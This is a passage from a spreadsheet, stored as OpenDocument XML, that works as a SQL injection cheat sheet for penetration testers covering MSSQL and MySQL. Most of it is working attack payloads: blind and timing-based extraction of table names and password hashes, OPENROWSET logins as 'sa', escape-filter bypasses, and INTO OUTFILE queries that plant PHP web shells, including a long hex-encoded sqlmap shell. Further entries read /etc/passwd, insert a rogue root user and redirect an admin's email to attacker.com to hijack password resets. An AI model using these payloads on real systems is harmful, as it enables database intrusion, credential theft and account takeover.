            <text:p>The choice of the charset for the bruteforce attack can cause a lot of problems. You will not be sure to get all the data because you don’t know what type the data is. By using the stored procedure <text:a xlink:href="http://ticwebguys.xwiki.com/xwiki/bin/view/Main/FnVarbintohexstr" xlink:type="simple">fn_varbintohexstr</text:a> you can convert the data in a hex value, so you will know the charset is “abcdef01234567890”.</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" office:value-type="string" calcext:value-type="string">
            <text:p>1 AND (1 &amp;lt;= (SELECT COUNT(*) FROM master..sysdatabases WHERE master.dbo.fn_varbintohexstr(CONVERT(varbinary,master..sysdatabases.name)) LIKE '0x6%')) –</text:p>
            <text:p>1 AND (1 &amp;lt;= (SELECT COUNT(*) FROM master..sysdatabases WHERE master.dbo.fn_varbintohexstr(CONVERT(varbinary,master..sysdatabases.name)) LIKE '0x6d%')) –</text:p>
            <text:p>1 AND (1 &amp;lt;= (SELECT COUNT(*) FROM master..sysdatabases WHERE master.dbo.fn_varbintohexstr(CONVERT(varbinary,master..sysdatabases.name)) LIKE '0x6d006%')) –</text:p>
            <text:p>1 AND (1 &amp;lt;= (SELECT COUNT(*) FROM master..sysdatabases WHERE master.dbo.fn_varbintohexstr(CONVERT(varbinary,master..sysdatabases.name)) LIKE '0x6d0061%')) --</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro4">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>Blind SQL Injection to attempt to locate tablenames by brute force iteration through potential names (you'll have to rename tablenames until you find a match):</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" office:value-type="string" calcext:value-type="string">
            <text:p>1' AND 1=(SELECT COUNT(*) FROM tablenames); --</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro3">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>Enumerating through database table names. By changing the 116 to different numbers you can use logrithmic reduction to find the first char of the database table name. Then iterating through the first 1 in 1, 1 you can eventually get the whole table name. Originally found by <text:a xlink:href="https://web.archive.org/web/20150420183409/http://www.spidynamics.com/whitepapers/Blind_SQLInjection.pdf" xlink:type="simple">Kevin Spett</text:a>:</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" office:value-type="string" calcext:value-type="string">
            <text:p>1 AND ASCII(LOWER(SUBSTRING((SELECT TOP 1 name FROM sysobjects WHERE xtype='U'), 1, 1))) &gt; 116</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro3">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>Extract hashes using BENCHMARK, (one char at a time)</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" office:value-type="string" calcext:value-type="string">
            <text:p>SELECT user FROM login WHERE user = ‘root’ UNION SELECT IF(SUBSTRING(passwordfield,1,1) = CHAR(97), BENCHMARK(1000000,MD5('x')),null) FROM login;</text:p>
            <text:p>SELECT user FROM login WHERE user = 'root’ UNION SELECT IF(SUBSTRING(passwordfield,1,2) = CHAR(97,97),</text:p>
            <text:p>BENCHMARK(1000000,MD5('x')),null) FROM login</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro6">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Extract hashes using BENCHMARK CHAR encoded</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT user FROM login WHERE user =</text:p>
            <text:p>CONCAT(CHAR(39),CHAR(97),CHAR(100),CHAR(109),CHAR(105),CHAR(110),CHAR( 39))</text:p>
            <text:p>UNION SELECT IF(SUBSTRING(pass,1,2) = CHAR(97,97),</text:p>
            <text:p>BENCHMARK(1000000,MD5(CHAR(59))),null) FROM login</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro4">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>As described with the standard sql injection you can get table structures and data. So build your own sql blind bruteforce script.</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13"/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:number-columns-repeated="2"/>
        </table:table-row>
        <table:table-row table:style-name="ro2">
          <table:table-cell table:style-name="ce2" office:value-type="string" calcext:value-type="string">
            <text:p>3 – Compatibility issues</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Default"/>
        </table:table-row>
        <table:table-row table:style-name="ro3">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>During some pentest I got some strange error on the syntax of the injections, I discovered that there was some compatibilty issues on the software set with <text:a xlink:href="http://msdn2.microsoft.com/en-us/library/ms178653.aspx" xlink:type="simple">sp_dbcmptlevel</text:a>. To avoid these limits you just need to change the database and work as with blind sql injections.</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" office:value-type="string" calcext:value-type="string">
            <text:p>1' ; use master; select * from OPENROWSET('SQLOLEDB', ''; 'sa'; 'password', 'select 1') --</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce4"/>
          <table:table-cell table:style-name="ce13"/>
        </table:table-row>
        <table:table-row table:style-name="ro2">
          <table:table-cell table:style-name="ce2" office:value-type="string" calcext:value-type="string">
            <text:p>4 – Escape errors</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Default"/>
        </table:table-row>
        <table:table-row table:style-name="ro5">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>Some very skilled programmers use some routines to escape the user input to avoid sql injection problems. Some of them escape the ‘ char with a \ (for example who uses php with a sql server db). He does not know that on mssql the escape is not \ but ”. So you can inject as normal, but you can not use the ‘ on the query. This can sometimes be a problem. To bypass this limitation you can use SET <text:a xlink:href="http://msdn2.microsoft.com/en-us/library/ms174393.aspx" xlink:type="simple">QUOTED_IDENTIFIER</text:a> OFF and use ” instead of ‘. Here is an example:</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" office:value-type="string" calcext:value-type="string">
            <text:p>a';SET QUOTED_IDENTIFIER OFF;select * FROM OPENROWSET("SQLOLEDB","";"sa";"password","SELECT 1");--</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1" table:number-rows-repeated="2">
          <table:table-cell table:number-columns-repeated="2"/>
        </table:table-row>
        <table:table-row table:style-name="ro2">
          <table:table-cell table:style-name="ce2" office:value-type="string" calcext:value-type="string">
            <text:p>5 – MISC and Functions</text:p>
          </table:table-cell>
          <table:table-cell/>
        </table:table-row>
        <table:table-row table:style-name="ro3">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Some TRUE statements</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>0.1 &lt;= 2;</text:p>
            <text:p>2 &gt;= 2;</text:p>
            <text:p>ISNULL(1/0);</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro4">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>MATH</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>FLOOR(7+RAND()*5));</text:p>
            <text:p>ROUND(23.298,-1);</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>LENGTH</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>LENGTH(COMPRESS(REPEAT(‘a’,1000)));</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro4">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>HASH</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>MD5(‘abc’);</text:p>
            <text:p>SHA1(‘abc’);</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro3">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>BENCHMARK / SLEEP</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" office:value-type="string" calcext:value-type="string">
            <text:p>BENCHMARK(10000000,ENCODE('abc','123')); #~5s on localhost</text:p>
            <text:p>BENCHMARK(1000000,MD5(CHAR(116))); #~7s on localhost</text:p>
            <text:p>BENCHMARK(10000000,MD5(CHAR(116))); #~70s on localhost</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Timeout / sleep IF user exists</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" office:value-type="string" calcext:value-type="string">
            <text:p>IF( user = 'root', BENCHMARK(1000000,MD5( 'x' )),NULL) FROM login</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro6">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Write to files without single quotes (chars = ‘admin’)</text:p>
            <text:p>Must specify new file and give correct path name</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" office:value-type="string" calcext:value-type="string">
            <text:p>SELECT password FROM tablename WHERE username =</text:p>
            <text:p>CONCAT(CHAR(39),CHAR(97),CHAR(100),CHAR(109),CHAR(105),CHAR(110),CHAR( 39)) INTO</text:p>
            <text:p>OUTFILE CONCAT(CHAR(39),CHAR(97),CHAR(100),CHAR(109),CHAR(105),CHAR(110),CHAR(</text:p>
            <text:p>39))</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro16">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>INTO OUTFILE</text:p>
            <text:p> Requires file_priv</text:p>
            <text:p> you can’t overwrite files with INTO OUTFILE</text:p>
            <text:p> INTO OUTFILE must be the last statement in the query</text:p>
            <text:p> there is no way I know of to encode the pathname, so quotes are required</text:p>
            <text:p> you can encode your code with char()</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" office:value-type="string" calcext:value-type="string">
            <text:p>SELECT '&lt;? system($_GET[\'c\']); ?&gt;' INTO OUTFILE '/var/www/shell.php';</text:p>
            <text:p/>
            <text:p>SELECT '&lt;? fwrite(fopen($_GET[f], \'w\'), file_get_contents($_GET[u])); ?&gt;' INTO OUTFILE '/var/www/get.php'</text:p>
            <text:p/>
            <text:p>Sqlmap: OR 9460=9460 LIMIT 0,1 INTO OUTFILE ‘var/www/shell.php’ LINES TERMINATED BY 0x3c3f7068702024633d245f524551554553545b22636d64225d3b407365745f74696d655f6c696d69742830293b4069676e6f72655f757365725f61626f72742831293b40696e695f73657428276d61785f657865637574696f6e5f74696d65272c30293b247a3d40696e695f676574282764697361626c655f66756e6374696f6e7327293b69662821656d70747928247a29297b247a3d707265675f7265706c61636528272f5b2c205d2b2f272c272c272c247a293b247a3d6578706c6f646528272c272c247a293b247a3d61727261795f6d617028277472696d272c247a293b7d656c73657b247a3d617272617928293b7d24633d24632e2220323e26315c6e223b66756e6374696f6e206628246e297b676c6f62616c20247a3b72657475726e2069735f63616c6c61626c6528246e29616e6421696e5f617272617928246e2c247a293b7d69662866282773797374656d2729297b6f625f737461727428293b73797374656d282463293b24773d6f625f6765745f636f6e74656e747328293b6f625f656e645f636c65616e28293b7d656c736569662866282770726f635f6f70656e2729297b24793d70726f635f6f70656e2824632c617272617928617272617928706970652c72292c617272617928706970652c77292c617272617928706970652c7729292c2474293b24773d4e554c4c3b7768696c65282166656f662824745b315d29297b24772e3d66726561642824745b315d2c353132293b7d4070726f635f636c6f7365282479293b7d656c73656966286628277368656c6c5f657865632729297b24773d7368656c6c5f65786563282463293b7d656c736569662866282770617373746872752729297b6f625f737461727428293b7061737374687275282463293b24773d6f625f6765745f636f6e74656e747328293b6f625f656e645f636c65616e28293b7d656c7365696628662827706f70656e2729297b24783d706f70656e2824632c72293b24773d4e554c4c3b69662869735f7265736f7572636528247829297b7768696c65282166656f6628247829297b24772e3d66726561642824782c353132293b7d7d4070636c6f7365282478293b7d656c7365696628662827657865632729297b24773d617272617928293b657865632824632c2477293b24773d6a6f696e28636872283130292c2477292e636872283130293b7d656c73657b24773d303b7d7072696e7420223c7072653e222e24772e223c2f7072653e223b3f3e-- –</text:p>
            <text:p/>
            <text:p>Sqlmap uses a ascii hex payload. Make sure to URL encoded. %3D for =, %27 for ‘, %2C for,, %2F for /</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro3">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>LINES TERMINATED BY</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" office:value-type="string" calcext:value-type="string">
            <text:p><text:span text:style-name="T2"> If you don't specify a LINES clause, the default is the same as if you had written this:</text:span></text:p>
            <text:p/>
            <text:p><text:span text:style-name="T2">LINES TERMINATED BY '\n'</text:span></text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce5" office:value-type="string" calcext:value-type="string">
            <text:p>INTO DUMPFILE</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" office:value-type="string" calcext:value-type="string">
            <text:p>Does not split chars between data like INTO OUTFILE</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro4">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Write userdb into outfile</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" office:value-type="string" calcext:value-type="string">
            <text:p>SELECT host,user,password FROM user INTO OUTFILE ‘/tmp/passwd’;</text:p>
            <text:p>SELECT host,user,password FROM user INTO OUTFILE ‘../../web/dir/file.txt’</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce5" office:value-type="string" calcext:value-type="string">
            <text:p>Retrieve etc/passwd, put into field, insert user, load data</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" office:value-type="string" calcext:value-type="string">
            <text:p>LOAD DATA INFILE “/etc/passwd” INTO TABLE LOGIN(profiletext,@var1) SET user = ‘r00t’,pass=’abc’</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce5" office:value-type="string" calcext:value-type="string">
            <text:p>Combine load file and into outfile to cp files</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" office:value-type="string" calcext:value-type="string">
            <text:p>0’ AND 1=1 UNION SELECT load_file(‘...’) INTO OUTFILE ‘...’;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce5" office:value-type="string" calcext:value-type="string">
            <text:p>Encoding load(ed)_file. Can decrypt hex with PHP Charset Encoder or other</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" office:value-type="string" calcext:value-type="string">
            <text:p>0’ AND 1=1 UNION SELECT hex(load_file(‘...’)) INTO OUTFILE ‘…’;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce5" office:value-type="string" calcext:value-type="string">
            <text:p>Write whatever you want into an arbitrary file (shell.php anyone?)</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" office:value-type="string" calcext:value-type="string">
            <text:p>0’ AND 1=1 UNION SELECT ‘code’,null INTO OUTFILE ‘../../web/server/dir/file.php’</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>CHAR (chars = ‘a’)</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" office:value-type="string" calcext:value-type="string">
            <text:p>CHAR(39,97,39)</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>INSERT</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" office:value-type="string" calcext:value-type="string">
            <text:p>INSERT INTO login SET user = ‘r00t’,pass=’abc’;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Password reset email capability? Update user email address</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" office:value-type="string" calcext:value-type="string">
            <text:p>UPDATE users SET email = ‘<text:a xlink:href="mailto:mymail@attacker.com" xlink:type="simple">mymail@attacker.com</text:a>’ WHERE email = ‘<text:a xlink:href="mailto:admin@site.com" xlink:type="simple">admin@site.com</text:a>’;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>HEX()</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT HEX(‘root’)</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>PASSWORD()</text:p>
          </table:table-cell>
          <table:table-cell/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>ENCODE()</text:p>
          </table:table-cell>
          <table:table-cell/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>COMPRESS()</text:p>
          </table:table-cell>
          <table:table-cell/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>ROW_COUNT()</text:p>
          </table:table-cell>
          <table:table-cell/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SCHEMA()</text:p>
          </table:table-cell>
          <table:table-cell/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>VERSION()</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>same as @@version</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>MID()</text:p>
          </table:table-cell>
          <table:table-cell/>
        </table:table-row>
        <table:table-row table:style-name="ro4">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>ExtractValue()</text:p>
            <text:p>Possible use if mysql_error() is being used</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT 1 AND ExtractValue(1,CONCAT(0x5c,(SELECT @@version)))</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro12">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Prefixes. Use prefixes and whitespaces as often as you want (prefixes typically after and/or)</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>“”</text:p>
            <text:p>%2B    +</text:p>
            <text:p>%2D    -</text:p>
            <text:p>%7E    ~</text:p>
            <text:p>%21     !</text:p>
            <text:p>%40    @</text:p>
            <text:p>%20    Space</text:p>
            <text:p>““</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Operators</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" office:value-type="string" calcext:value-type="string">
            <text:p>^, =, !=, %, /, *, &amp;, &amp;&amp;, |, ||, , &gt;&gt;, &lt;=, &lt;=, ,, XOR, DIV, LIKE, SOUNDS LIKE, RLIKE, REGEXP, LEAST, GREATEST, CAST, CONVERT, IS, IN, NOT, MATCH, AND, OR, BINARY, BETWEEN, ISNULL</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro17">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>whitespaces. Use prefixes and whitespaces as often as you want</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>%20    Space</text:p>
            <text:p>%09    Horizontal Tab</text:p>
            <text:p>%0a    New line</text:p>
            <text:p>%0b    Vertical Tab</text:p>
            <text:p>%0c    New page</text:p>
            <text:p>%0d    Carriage return</text:p>
            <text:p>%a0    Non-breaking space</text:p>
            <text:p>/**/</text:p>
            <text:p/>
            <text:p>Ex: ‘or+(1)sounds/**/like“1“–%a0-</text:p>
            <text:p>Ex: ‘union(select(1),tabe_name,(3)from`information_schema`.`tables`)#</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro4">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Parentheses can also be used to avoid use of spaces</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>%28</text:p>
            <text:p>%29</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro18">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>comments</text:p>
            <text:p> The backtick can only be used to end a query when used as an alias.</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>/*</text:p>
            <text:p>#</text:p>
            <text:p>%23</text:p>
            <text:p>–</text:p>
            <text:p>`</text:p>
            <text:p><text:span text:style-name="T3">;%00</text:span></text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro18">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Strings with quotes</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT ‘a’</text:p>
            <text:p>SELECT “a”</text:p>
            <text:p>SELECT n’a’</text:p>
            <text:p>SELECT b’1100001′</text:p>
            <text:p>SELECT _binary’1100001′</text:p>
            <text:p>SELECT x’61′</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Strings without quotes</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>‘abc’ = 0×616263</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro3">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Aliases</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>select pass as alias from users</text:p>
            <text:p>select pass aliasalias from users</text:p>
            <text:p>select pass`alias alias`from users</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro18">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Strings with functions</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>‘abc’ = unhex(616263)</text:p>
            <text:p>‘abc’ = char(97,98,99)</text:p>
            <text:p>hex(‘a’) = 61</text:p>
            <text:p>ascii(‘a’) = 97</text:p>
            <text:p>ord(‘a’) = 97</text:p>
            <text:p>‘ABC’ = concat(conv(10,10,36),conv(11,10,36),conv(12,10,36))</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro19">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Substrings</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>substr(‘abc’,1,1) = ‘a’</text:p>
            <text:p>substr(‘abc’ from 1 for 1) = ‘a’</text:p>
            <text:p>substring(‘abc’,1,1) = ‘a’</text:p>
            <text:p>substring(‘abc’ from 1 for 1) = ‘a’</text:p>
            <text:p>mid(‘abc’,1,1) = ‘a’</text:p>
            <text:p>mid(‘abc’ from 1 for 1) = ‘a’</text:p>
            <text:p>lpad(‘abc’,1,space(1)) = ‘a’</text:p>
            <text:p>rpad(‘abc’,1,space(1)) = ‘a’</text:p>
            <text:p>left(‘abc’,1) = ‘a’</text:p>
            <text:p>reverse(right(reverse(‘abc’),1)) = ‘a’</text:p>
            <text:p>insert(insert(‘abc’,1,0,space(0)),2,222,space(0)) = ‘a’</text:p>
            <text:p>space(0) = trim(version()from(version()))</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro5">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Search substrings</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>locate(‘a’,'abc’)</text:p>
            <text:p>position(‘a’,'abc’)</text:p>
            <text:p>position(‘a’ IN ‘abc’)</text:p>
            <text:p>instr(‘abc’,'a’)</text:p>
            <text:p>substring_index(‘ab’,'b’,1)</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro4">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Cut substrings</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>length(trim(leading ‘a’ FROM ‘abc’))</text:p>
            <text:p>length(replace(‘abc’, ‘a’, ”))</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro5">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Compare strings</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>strcmp(‘a’,'a’)</text:p>
            <text:p>mod(‘a’,'a’)</text:p>
            <text:p>find_in_set(‘a’,'a’)</text:p>
            <text:p>field(‘a’,'a’)</text:p>
            <text:p>count(concat(‘a’,'a’))</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro13">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>String case</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>ucase</text:p>
            <text:p>lcase</text:p>
            <text:p>lower</text:p>
            <text:p>upper</text:p>
            <text:p>password(‘a’) != password(‘A’)</text:p>
            <text:p>old_password(‘a’) != old_password(‘A’)</text:p>
            <text:p>md5(‘a’) != md5(‘A’)</text:p>
            <text:p>sha(‘a’) != sha(‘A’)</text:p>
            <text:p>aes_encrypt(‘a’) != aes_encrypt(‘A’)</text:p>
            <text:p>des_encrypt(‘a’) != des_encrypt(‘A’)</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro6">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Control flow</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>case ‘a’ when ‘a’ then 1 [else 0] end</text:p>
            <text:p>case when ‘a’='a’ then 1 [else 0] end</text:p>
            <text:p>if(‘a’='a’,1,0)</text:p>
            <text:p>ifnull(nullif(‘a’,'a’),1)</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Truncating vulnerability</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Check notes, if field is limited in length and truncates values, a vulnerability could exist</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:number-columns-repeated="2"/>
        </table:table-row>
        <table:table-row table:style-name="ro2">
          <table:table-cell table:style-name="ce2" office:value-type="string" calcext:value-type="string">
            <text:p>6 – Older Stuff</text:p>
          </table:table-cell>
          <table:table-cell/>
        </table:table-row>
        <table:table-row table:style-name="ro4">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Bypassing PHP functions</text:p>
            <text:p>(MySQL 4.1.x before 4.1.20 and 5.0.x)</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" office:value-type="string" calcext:value-type="string">
            <text:p>WHERE x = 0xbf27admin 0xbf27</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro4">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Bypassing addslashes() with GBK encoding</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>"injection string"</text:p>
            <text:p>に関する追加情報：</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>Bypassing mysql_real_escape_string() with BIG5 or GBK (chars are Chinese Big5)</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" office:value-type="string" calcext:value-type="string">
            <text:p>SELECT * FROM login WHERE user = 0x726F6F74</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Using HEX encoded query (user = ‘root’)</text:p>
          </table:table-cell>
          <table:table-cell/>
        </table:table-row>
        <table:table-row table:style-name="ro5">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Funky version detection</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>/*!32302 10*/</text:p>
            <text:p>10 </text:p>
            <text:p>same response if MySQL version higher than 3.23.02</text:p>
            <text:p>SELECT /*!32302 1/0, */ 1 FROM tablename </text:p>
            <text:p>Will throw division by 0 error if MySQL version higher than 3.23.02</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:number-columns-repeated="2"/>
        </table:table-row>
        <table:table-row table:style-name="ro2">
          <table:table-cell table:style-name="ce2" office:value-type="string" calcext:value-type="string">
            <text:p>7 – Queries Only</text:p>
          </table:table-cell>
          <table:table-cell/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>From PenTestMonkey</text:p>
          </table:table-cell>
          <table:table-cell/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
